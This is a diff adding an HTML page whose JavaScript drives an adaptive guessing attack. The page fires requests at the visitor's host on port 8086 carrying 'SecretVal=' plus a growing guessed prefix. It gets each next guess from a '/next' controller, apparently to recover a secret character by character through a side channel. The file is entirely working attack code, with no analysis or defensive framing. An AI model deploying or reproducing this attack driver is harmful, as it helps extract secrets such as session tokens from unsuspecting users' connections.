@@ -1,0 +1,142 @@
+<html>
+<body>
+	<script>
+
+	var xmlhttp;
+	var xmlhttp2;
+	currentRequest = "";
+	tempdictionary = "";
+	prefix = "";
+
+	requestCount = 0;
+
+	function sleep(milliseconds) {
+	  var start = new Date().getTime();
+	  for (var i = 0; i < 1e7; i++) {
+	    if ((new Date().getTime() - start) > milliseconds){
+	      break;
+	    }
+	  }
+	}
+
+
+	xmlhttp=new XMLHttpRequest();
+		//xmlhttp.onreadystatechange = RecieveResponse;
+
+	//document.write("Priming the pump" + "<BR>");
+	
+	var site = location.protocol + "//" + location.hostname + ":8086/?val=SecretVal=";  //target url
+	xmlhttp.open("GET", site ,true);
+	xmlhttp.send(null);
+	sleep(1500);
+
+
+
+	//input value to append to URL
+	//output: none
+	function SendRequest(value)
+	{
+		//alert(1);
+		xmlhttp=new XMLHttpRequest();
+		//xmlhttp.onreadystatechange = RecieveResponse;
+
+		document.write("Requesting:" + value + "<BR>");
+		
+		//var site= "http://127.0.0.1:8888/?val="; 
+		var site = location.protocol + "//" + location.hostname + ":8086/?val=SecretVal=";  //target url
+		var URL = site + prefix + value;
+		xmlhttp.open("GET", URL ,true);
+		xmlhttp.send(null);
+		
+		sleep(500); //some sort of timing issue with getn
+
+		//if (requestCount < 4)
+			GetNewRequest(value);
+		//requestCount++;
+	}
+
+	GetNewRequest("");
+	
+	//UrlLegnth=2588;
+	//var date1;
+	//var ref;
+	//var count =30
+
+
+	//input: response
+	//output: calls sendrequest
+	/*function RecieveResponse
+	{
+		if(xmlhttp.readyState == 4)
+		{
+			document.write("ReponseReceived:" + xmlhttp.responseText + "<BR>");
+
+			//SendRequest(xmlhttp.responseText);
+			SendRequest("a");
+		}
+
+	}*/
+
+	function RecieveResponse()
+	{
+		//alert(2);
+		if(xmlhttp2.readyState == 4 && xmlhttp2.status == 200)
+		{
+			document.write("ReponseReceived:" + xmlhttp2.responseText + "<BR>");
+
+			//currentRequest = xmlhttp2.responseText;
+
+			ojson = JSON.parse(xmlhttp2.responseText);
+
+			currentRequest = ojson['next'];
+			prefix = ojson['prefix'];
+			tempdictionary = ojson['tempdictionary'];
+
+			//document.write("JSON:" + ojson + "<BR>");
+			document.write("currentRequest:" + currentRequest + "<BR>");
+
+			//alert(ojson.count);
+
+			
+			if(currentRequest != "QUIT")
+			{
+				//SendRequest(xmlhttp2.responseText);
+				SendRequest(currentRequest);
+			}
+		}
+
+	}
+
+	//input last request
+	//output next request
+	function GetNewRequest(lastrequest)
+	{
+		//document.write("Debug1" + "<BR>");
+		//alert(3);
+
+		xmlhttp2=new XMLHttpRequest();
+		xmlhttp2.onreadystatechange = RecieveResponse;
+
+		//old GET
+		/*
+		var site= "http://127.0.0.1:8888/next?val="; 
+		var URL = site + currentRequest;
+		xmlhttp2.open("GET", URL ,true);
+		xmlhttp2.send(null);
+		*/
+
+		
+		var site= location.protocol + "//" + location.host + "/next"; 
+		//var URL = site;
+
+		
+
+		xmlhttp2.open("POST", site ,true);
+		xmlhttp2.send(JSON.stringify({"last": currentRequest,"tempdictionary": tempdictionary, "prefix": prefix}));
+		
+
+	}
+
+	</script>
+</body>
+</html>
